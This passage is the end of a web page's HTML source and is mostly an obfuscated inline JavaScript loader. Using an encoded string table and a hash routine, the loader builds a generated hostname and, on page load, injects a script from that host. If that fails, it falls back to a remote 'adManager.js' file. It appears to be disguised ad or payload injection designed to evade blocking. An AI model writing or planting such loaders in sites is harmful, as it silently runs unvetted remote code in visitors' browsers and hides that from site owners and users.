(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>